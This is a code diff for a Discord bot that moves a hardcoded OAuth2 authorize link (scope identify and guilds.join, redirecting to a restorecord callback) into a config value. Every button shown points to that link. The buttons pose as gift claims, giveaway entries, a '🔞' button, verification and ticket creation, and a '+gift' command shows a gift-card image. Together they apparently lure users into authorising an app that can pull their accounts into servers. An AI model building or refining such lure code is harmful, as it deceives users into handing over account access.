@@ -10,6 +10,7 @@ const discordbuttons = require('discord-buttons')
 let os = require("os");
 const { MessageButton, MessageActionRow, URL, ButtonBuilder, Link} = require("discord-buttons")
 const keepAlive = require("./server");
+const { authlink } = require('./config');
 client.prefix = "+"
 
 
@@ -133,7 +134,7 @@ client.on('message', async (message) => {
         const z = new MessageButton()
             .setStyle("url")
             .setLabel("🔞")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([z])
 
@@ -159,7 +160,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Claim")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -177,7 +178,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Claim")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -190,7 +191,7 @@ client.on("message", async (message) => {
   if (message.content.startsWith("+gift")) {
     let button = new MessageButton()
     .setStyle('url')
-    .setURL('https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318')
+    .setURL(authlink)
     .setLabel('Claim');
     message.channel.send('https://seagm-media.seagmcdn.com/item_480/1385.png?x-oss-process=image/resize,w_360',button)
   }
@@ -209,7 +210,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("🎁 Claim")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -228,7 +229,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("🎉 Enter")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -246,7 +247,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Claim")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -265,7 +266,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Verify here")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -285,7 +286,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("Respond")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
@@ -305,7 +306,7 @@ client.on('message', async (message) => {
         const y = new MessageButton()
             .setStyle("url")
             .setLabel("📩 Create ticket")
-            .setURL("https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318")
+            .setURL(authlink)
         const row = new MessageActionRow()
             .addComponent([y])
 
